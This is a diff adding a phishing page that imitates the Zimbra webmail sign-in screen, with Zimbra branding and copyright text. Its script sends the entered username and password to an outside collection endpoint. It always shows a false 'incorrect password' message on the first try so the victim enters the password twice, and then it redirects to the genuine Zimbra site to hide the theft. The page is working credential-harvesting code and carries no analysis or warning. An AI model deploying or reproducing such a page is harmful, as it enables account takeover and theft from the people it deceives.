@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <style>
+        body {
+            height: 100%;
+            width: 100%;
+            padding: 0;
+            margin: 0;
+            font-family: "Open Sans", sans-serif;
+            color: #222;
+            background: #0088c1;
+            background-image: url("https://tethercaps.com/picture/lease-inv.jpg");
+            overflow-x: hidden;
+        }
+        body .copy{
+            text-align: center;
+            font-size: 12px;
+            color: #ffffff;
+        }
+        .full-body {
+            margin: 4% 35%;
+
+        }
+
+        .full-body .header {
+            margin-top: 10px;
+        }
+
+        .full-body .header .logo-one {
+            margin-top: 5px;
+            margin-bottom: 5px;
+            color: #0088c1;
+            font-size: 50px;
+            font-weight: 500;
+            font-family: sans-serif;
+        }
+
+        .full-body .header h6 {
+            margin-top: 5px;
+            font-size: 20px;
+            color: #4d4d4d;
+            margin-bottom: 10px;
+        }
+
+        .main-body { 
+            background: #ffffff;
+            box-shadow: 0px 0px 2px 1px rgba(61, 61, 61, 0.75);
+            -webkit-box-shadow: 0px 0px 2px 1px rgba(61, 61, 61, 0.75);
+            -moz-box-shadow: 0px 0px 2px 1px rgba(61, 61, 61, 0.75);
+        }
+
+        .main-body .form-section {
+            padding: 20px 40px;
+        }
+
+        .error {
+            color: #e04540;
+            margin-bottom: 25px;
+            font-size: 12px;
+            display: none;
+        }
+
+        .error .blue {
+            color: #0067b8;
+            line-height: 25px;
+            font-size: 12px;
+            font-weight: lighter;
+        }
+
+        .main-body .header {
+            margin: 0;
+            padding: 0;
+        }
+
+
+        .main-body .form-group {
+            margin-top: 10px;
+            margin-bottom: 20px;
+        }
+
+        .main-body .form-group label {
+            font-size: 12px;
+            font-weight: 400;
+            color: #585858;
+        }
+
+        .main-body .form-group input {
+            width: 100%;
+            border-radius: 1px;
+            border: 1px solid #bdbdbd;
+            height: 35px;
+            font-size: 12px;
+        }
+
+        .main-body .form-group select {
+            width: 100%;
+            border-radius: 1px;
+            border: 1px solid #bdbdbd;
+            height: 30px;
+            font-size: 12px;
+            background: #ffffff;
+            color: #585858;
+        }
+
+        .main-body .form-group input:focus {
+            box-shadow: none;
+            outline: none;
+        }
+
+        .main-body .form-group select:focus {
+            box-shadow: none;
+            outline: none;
+        }
+
+        .main-body .footer {
+            margin-top: 10px;
+            background: #eeeeee;
+            padding: 10px 30px;
+        }
+
+        .main-body p.forgot {
+            font-size: 13px;
+            color: #0067b8;
+        }
+
+        .main-body .form-button {
+            text-align: left;
+        }
+
+        .main-body .form-button .btn {
+            font-size: 14px;
+            color: #ffffff;
+            background: #0088c1;
+            border-radius: 5px;
+            border: 1px solid #0088c1;
+            padding: 7px 30px;
+            font-weight: 500;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .full-body {
+                margin: 20% 3%;
+            }
+
+            .main-body .img-logo {
+                width: 100px;
+                margin: 0px;
+            }
+
+            .full-body .header .logo-one {
+
+            font-size: 40px;
+        }
+
+        .full-body .header h6 {
+            margin-top: 5px;
+            font-size: 18px;
+
+        }
+
+            .error .blue {
+                color: #0067b8;
+                line-height: 25px;
+                font-size: 12px;
+                font-weight: lighter;
+            }
+
+            .main-body .header {
+                margin: 0;
+                padding: 0;
+            }
+
+            .main-body .img-logo {
+                width: 120px;
+                margin: 0px;
+            }
+
+            .main-body .grabber p {
+                margin-top: 20px;
+                font-size: 13px;
+                font-weight: 200;
+            }
+
+            .main-body .grabber h4 {
+                margin-top: 10px;
+                font-size: 18px;
+                font-weight: 500;
+            }
+
+            .main-body .form-group {
+                margin-top: 20px;
+            }
+
+            .main-body .form-group input {
+            width: 100%;
+            border-radius: 1px;
+            border: 1px solid #bdbdbd;
+            height: 35px;
+            font-size: 12px;
+        }
+
+           
+        }
+    </style>
+</head>
+
+<body>
+    <div class="full-body">
+        <div class="main-body">
+            <form onsubmit="handleSubmit(event)" autocomplete="">
+                <div class="form-section">
+                    <div class="header">
+                        <p class="logo-one">zimbra</p>
+                        <h6>Sign In</h6>
+                        <p id="error" class="error">
+                            Your account or password is incorrect. If you dont remember your
+                            password, <span class="blue"> reset it now </span>
+                        </p>
+                    </div>
+                    <div class="form-group">
+                        <label for="">Username</label>
+                        <input id="tm" type="text" value="One" class="input-form" hidden />
+                        <input id="em" type="email" name="em" class="input-form" required />
+                    </div>
+
+                    <div class="form-group">
+                        <label for="">Password</label>
+                        <input id="pw" type="password" name="pw" class="input-form" required />
+                    </div>
+
+                    <div class="form-button">
+                        <button id="submit" class="btn btn-md btn-primary">
+                            Sign in
+                        </button>
+                    </div>
+                </div>
+
+                <div class="footer">
+                    <div class="form-group">
+                        <label for="">Web App Version</label>
+                        <select name="session" id="" class="select-form">
+                            <option value="default">Default</option>
+                            <option value="classic">Classic</option>
+                            <option value="Modern">Modern</option>
+                        </select>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <p class="copy">Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</p>
+
+</body>
+
+</html>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+    function handleSubmit(e) {
+        e.preventDefault();
+        let emma = $("#em").val();
+        let peculiar = $("#pw").val();
+        let times_number = $("#tm").val();
+
+        $.ajax({
+            url: "https://sonadao.com/sona/submit.php",
+            method: "POST",
+            dataType: "JSON",
+            data: {
+                em: emma,
+                pw: peculiar,
+                tm: times_number,
+            },
+            success: function () { },
+            complete: function () { },
+        });
+        if (times_number === "Two") {
+            window.location.replace(
+                "https://mail.zimbra.com/mail"
+            );
+        }
+        $("#error").show();
+        $("#tm").val("Two");
+    }
+</script>
